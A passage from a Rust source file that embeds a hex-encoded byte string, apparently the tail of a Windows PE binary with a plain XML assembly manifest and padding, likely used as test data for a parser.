170000bc2f0000bc170000f0170000bc2f0000f017000005180000bc2f00000818000030180000bc2f00003018000045180000bc2f000048180000a818000054300000a8180000d8180000bc2f0000d8180000ec180000bc2f0000ec180000351900001830000038190000c319000018300000c41900005c1a00002c3000005c1a0000801a000018300000801a0000a91a000018300000bc1a0000071c000068300000081c0000441c000078300000441c0000801c000078300000841c0000251e0000843000008c1e0000a91e0000bc2f0000ac1e0000071f0000a4300000201f0000221f000098300000401f0000461f0000a0300000461f00005d1f0000602f00005d1f0000761f0000602f0000761f00008a1f0000602f00008a1f0000c01f0000ec2f0000c01f0000d81f00004c30000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010018000000180000800000000000000000000000000000010002000000300000800000000000000000000000000000010009040000480000006060000091000000000000000000000000000000000000003c3f786d6c2076657273696f6e3d27312e302720656e636f64696e673d275554462d3827207374616e64616c6f6e653d27796573273f3e0d0a3c617373656d626c7920786d6c6e733d2775726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763127206d616e696665737456657273696f6e3d27312e30273e0d0a3c2f617373656d626c793e0d0aa000000020a128a130a138a140a198a1a0a150a258a260a2a8a2d0a2d8a2e0a2e8a210a358a368a370a378a380a388a390a398a3c0a3d0a3e0a3f0a300a410a420a430a440a450a460a470a488a4a8a438a560a570a580a5c0a5d0a5e0a5f0a520a650a660a690a6a0a6b0a6c0a6d0a6e0a6f0a600a710a720a730a740a790a998a9a0a9a8a9b8a910aa08ab20ab28abb0abc8abd0abd8abe0ab000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000").to_owned();

    bytes
}

